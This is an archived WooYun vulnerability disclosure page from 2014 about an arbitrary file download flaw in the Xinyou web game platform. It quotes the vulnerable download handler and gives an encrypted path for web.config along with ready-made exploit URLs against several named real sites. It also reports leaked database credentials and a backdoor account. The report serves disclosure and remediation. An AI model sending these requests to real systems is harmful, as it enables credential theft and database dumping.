@@ -1,0 +1,279 @@
+﻿<!doctype html>
+                        <html lang="en">
+                        <head>
+	                        <meta charset="UTF-8">
+	                        <title>		信游科技页游平台程序通用型任意文件下载可能导致大规模拖库（基于免费版）  </title>
+	                        <link href="../css/css.css" rel="stylesheet" /> 
+                        </head>
+                        <body> 
+                        <ul><li>标题：		信游科技页游平台程序通用型任意文件下载可能导致大规模拖库（基于免费版）  </li><li>作者：		<a href="http://www.wooyun.org/whitehats/wefgod">wefgod</a> 
+</li><li>提交时间：		2014-01-16 10:42</li></ul>
+                        <div class="con">
+                        <h2>漏洞详情</h2>
+		<h3 class="detailTitle">披露状态：</h3>
+		<p class="detail" style="padding-bottom:0">
+					</p>
+		<p class="detail">
+									2014-01-16：	细节已通知厂商并且等待厂商处理中<br/>
+									2014-01-20：	厂商已经确认，细节仅向厂商公开<br/>
+									2014-01-23：	细节向第三方安全合作伙伴开放<br/>
+									2014-01-30：	细节向核心白帽子及相关领域专家公开<br/>
+									2014-02-09：	细节向普通白帽子公开<br/>
+									2014-03-01：	细节向实习白帽子公开<br/>
+									2014-04-16：	细节向公众公开<br/>
+					</p>
+		<h3 class="detailTitle">简要描述：</h3>
+
+		<p class="detail">之前发的只要未提到“新版”的话我都是基于对官网提供的所谓“免费版”进行审计的</p>
+
+				
+						<h3 class="detailTitle">详细说明：</h3>
+		
+			<p class="detail"> <a target="_blank" href="http://www.wooyun.org/bugs/wooyun-2014-048661">WooYun: 信游科技页游平台程序通用型代码级后门账户(成功登录多个商业后台并可操纵订单和游戏)</a>   看了这个洞里面厂商的回复，似乎厂商不太理解一些问题。为了回复您的问题，我只能多挖一个漏洞来提交好在详细说明里面给您回复了。<br />
+<br />
+<br />
+<br />
+</p><pre><code>2014-01-15 15:28 | 信游科技页游(乌云厂商) 0<br />
+这是源代码啊.他们技术自己发的吧.程序员是不是和公司闹变扭了.拿段测试代码就上来了.</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+1.源代码是你们在官网提供的，http://52xinyou.cn/chanpin.htm 在这里面有一个“立即下载”，里面的超链接是http://52xinyou.cn/信游免费版.rar  我的网站结构和信息都是从这里来的<br />
+<br />
+2.你们程序员是不是有人离职？可能是某人离职前留下的后门账号。<br />
+<br />
+3.似乎厂商感觉新版要发布了，就有点忽略了在用的旧版、已传播开的免费版的安全问题了（看意思我理解是不打算修复，以后升级新版），但是目前在用的很多都是商业网站，建议还是更新下目前在用的客户的代码，然后建议也暂停免费版的下载。<br />
+<br />
+4.发现后门账户的dll位置在  “信游免费版\xymfpt\平台\web\bin\DataManage.dll” </p>
+				
+									<h3 class="detailTitle">漏洞证明：</h3>
+
+			<p class="detail">下面开始说下这个任意文件下载。<br />
+<br />
+<br />
+<br />
+信游免费版\xymfpt\平台\web\Api\download.ashx<br />
+<br />
+</p><pre><code>public void ProcessRequest(HttpContext context)<br />
+    {<br />
+        DataManage.DownLoadManage down = new DataManage.DownLoadManage();<br />
+        down.FileDown(context);<br />
+}</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+信游免费版\xymfpt\平台\web\bin\DataManage.dll<br />
+<br />
+</p><pre><code>DataManage.DownLoadManage.FileDown<br />
+        public void FileDown(HttpContext context)<br />
+        {<br />
+            string text = context.Request.QueryString[&quot;fid&quot;];  //fid是加密的路径<br />
+            context.Response.ContentType = &quot;text/plain&quot;;<br />
+            if (Utility.IsEmptyString(text))<br />
+            {<br />
+                …………<br />
+            }<br />
+            else<br />
+            {<br />
+                text = text.Trim().Replace(&quot;%3d&quot;, &quot;=&quot;).Replace(&quot; &quot;, &quot;+&quot;).Replace(&quot;%2f&quot;, &quot;/&quot;);<br />
+                string strKey = &quot;???&quot;;  //这是加密解密的密钥，屏蔽了<br />
+                string path = Utility.Decrypt3DES(text, strKey);  //解密获取到的路径<br />
+                string text2 = context.Server.MapPath(path);   //获取我们传入的虚拟路径的物理路径<br />
+                if (File.Exists(text2))<br />
+                {<br />
+                    string extName = text2.Substring(text2.LastIndexOf(&#039;.&#039;));<br />
+                    Stream stream = File.OpenRead(text2);		//直接读取text2指定的路径了，导致漏洞的产生<br />
+                    …………<br />
+                    while (num &gt; 0L &amp;&amp; context.Response.IsClientConnected)<br />
+                    {<br />
+                        int num2 = stream.Read(buffer, 0, Convert.ToInt32(51200L));<br />
+                        context.Response.OutputStream.Write(buffer, 0, num2);<br />
+                        context.Response.Flush();<br />
+                        num -= (long)num2;<br />
+                    }<br />
+………………</code></pre><p class='detail'><br />
+<br />
+<br />
+<br />
+给一个路径的例子：<br />
+<br />
+~/web.config 对应的密文是 <br />
+<br />
+nUDWEgdorSH4j/+9GiQTlA==<br />
+<br />
+<br />
+<br />
+给下web.config的利用：<br />
+<br />
+http://www.12wan.com/api/download.ashx?fid=nUDWEgdorSH4j/+9GiQTlA==<br />
+<br />
+</p><p class="detail"><a href="../images/152339579fc825a9bb321c91d31408d031d0d157.png" target="_blank"><img src="../images/152339579fc825a9bb321c91d31408d031d0d157.png" alt="image001.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/15234010cd4194baaaa821cafa167558b2e8ffb2.png" target="_blank"><img src="../images/15234010cd4194baaaa821cafa167558b2e8ffb2.png" alt="image002.png" width="600"/></a></p><p class="detail"><br />
+<br />
+http://www.vipwan.com/api/download.ashx?fid=nUDWEgdorSH4j/+9GiQTlA==<br />
+<br />
+</p><p class="detail"><a href="../images/15234035572ff25f24f8951b7bc0e77dc6efab19.png" target="_blank"><img src="../images/15234035572ff25f24f8951b7bc0e77dc6efab19.png" alt="image004.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/15234046c4beca5729906493033b0472ae416449.png" target="_blank"><img src="../images/15234046c4beca5729906493033b0472ae416449.png" alt="image005.png" width="600"/></a></p><p class="detail"><br />
+<br />
+<br />
+<br />
+http://52xinyou.cn/anli.htm 下的案例基本全秒。<br />
+<br />
+<br />
+<br />
+http://www.ailiuwa.com/api/download.ashx?fid=nUDWEgdorSH4j/+9GiQTlA==<br />
+<br />
+http://www.17188.com/api/download.ashx?fid=nUDWEgdorSH4j/+9GiQTlA==<br />
+<br />
+http://www.teiyi.com/api/download.ashx?fid=nUDWEgdorSH4j/+9GiQTlA==<br />
+<br />
+http://www.9797wan.com/api/download.ashx?fid=nUDWEgdorSH4j/+9GiQTlA==<br />
+<br />
+等等<br />
+<br />
+<br />
+<br />
+可以直接下载包含数据库用户名、密码的配置文件（为了避免一些问题这个就截图为证，不放链接了）<br />
+<br />
+</p><p class="detail"><a href="../images/15234123df114f7b71be79183c5912682a3dcf58.png" target="_blank"><img src="../images/15234123df114f7b71be79183c5912682a3dcf58.png" alt="image007.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/15234142e2143048e0079bc5ba445af127ea959a.png" target="_blank"><img src="../images/15234142e2143048e0079bc5ba445af127ea959a.png" alt="image009.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/152341578592084584700ddcc46e5f5a2081c83f.png" target="_blank"><img src="../images/152341578592084584700ddcc46e5f5a2081c83f.png" alt="image011.png" width="600"/></a></p><p class="detail"><br />
+<br />
+部分数据库已经连上，拖库分分钟搞定啊……<br />
+<br />
+</p><p class="detail"><a href="../images/1523422151f588f8703aa40d01a96e6ae7196932.png" target="_blank"><img src="../images/1523422151f588f8703aa40d01a96e6ae7196932.png" alt="image013.png" width="600"/></a></p><p class="detail"><br />
+<br />
+</p><p class="detail"><a href="../images/152342334d829fdb6be7c6c2788ba681d105bf40.png" target="_blank"><img src="../images/152342334d829fdb6be7c6c2788ba681d105bf40.png" alt="image014.png" width="600"/></a></p><p class="detail"> </p>
+
+									<h3 class="detailTitle">修复方案：</h3>
+			<p class="detail">限制可下载的文件的目录 </p>
+										<h3 class="detailTitle">版权声明：转载请注明来源 <a style="font-weight:normal" href="http://www.wooyun.org/whitehats/wefgod" title="wefgod">wefgod</a>@<a style="font-weight:normal" href="http://www.wooyun.org/bugs/wooyun-2010-049024" title="信游科技页游平台程序通用型任意文件下载可能导致大规模拖库（基于免费版）">乌云</a></h3>
+		<hr align="center"/>
+
+				
+			<h2>漏洞回应</h2>
+			
+			
+															<h3 class="detailTitle">厂商回应：</h3>
+						<p class="detail">危害等级：高</p>
+						<p class="detail">漏洞Rank：20 </p>
+													<p class="detail">确认时间：2014-01-20 10:58</p>
+												<h3 class="detailTitle">厂商回复：</h3>				
+						<p class="detail">非常感激  新版年前会全部覆盖所有用户   也会推出新版免费下载 供大家研究测试</p>
+					
+
+					
+					
+					<h3 class="detailTitle">最新状态：</h3>
+
+											<p class="detail">暂无</p>
+					
+
+							
+					
+		
+<hr align="center" />
+<script type="text/javascript">
+var bugid="49024";
+var bugRating="-3";
+var myRating="";
+var ratingCount="0";
+
+
+
+function ShowBugRating(k){
+	var ratingItems=$(".myrating span");
+	$.each(ratingItems,function(i,n){
+		var nk=parseInt($(n).attr("rel"));
+		if(nk<=k){
+			$(n).addClass("on");
+		}else{
+			$(n).removeClass("on");
+		}
+	});
+	$(".myrating span").hover(
+		function(){
+			$("#ratingShow").html($(this).attr("data-title"));
+		},
+		function(){
+			$("#ratingShow").html("");
+		}
+	);
+}
+$(document).ready(function(){
+	if(myRating==""){
+		var ratingItems=$(".myrating span");
+		$(".myrating span").hover(
+			function(){
+				$(this).addClass("hover");
+				var k=parseInt($(this).attr("rel"));
+				$.each(ratingItems,function(i,n){
+					var nk=parseInt($(n).attr("rel"));
+					if(nk<k) $(n).addClass("on");
+					if(nk>k) $(n).removeClass("on");
+				});
+				$("#ratingShow").html($(this).attr("data-title"));
+			},
+			function(){
+				$(this).removeClass("hover");
+				if($("#myRating").val()==""){
+					$.each(ratingItems,function(i,n){
+						$(n).removeClass("on");
+					});
+				}
+				$("#ratingShow").html("");
+			}
+		);
+
+		$(".myrating span").click(function(){
+			var rating=$(this).attr("rel");
+			var k=parseInt($(this).attr("rel"));
+			$.post("/ajaxdo.php?module=bugrating",{"id":bugid,"rating":rating,"token":$("#token").val()},function(re){
+				//消除操作绑定
+				$(".myrating span").unbind();
+				re=parseInt(re);
+				switch(re){
+					case 1:
+						$("#ratingShow").html("评分成功");
+						$("#ratingSpan").html(parseInt($("#ratingSpan").html())+1);
+						$.each(ratingItems,function(i,n){
+							var nk=parseInt($(n).attr("rel"));
+							if(nk<=k){
+								$(n).addClass("on");
+							}else{
+								$(n).removeClass("on");
+							}
+						});
+						ShowBugRating(rating);
+						break;
+					case 2:
+						$("#ratingShow").html("请先登录");
+						break;
+					case 4:
+						$("#ratingShow").html("已对此漏洞进行过评分");
+						break;
+					case 6:
+						$("#ratingShow").html("不能对自己发布的漏洞进行评分");
+						break;
+					default:break;
+				}
+			});
+		});
+	}else{
+		if(ratingCount>2){
+			ShowBugRating(bugRating);
+		}else{
+			ShowBugRating(-3);
+		}
+	}
+});
+
+</script>
+<h3 class="detailTitle">漏洞评价：</h3>
+                        </div>
+                        </body>
+                        </html>
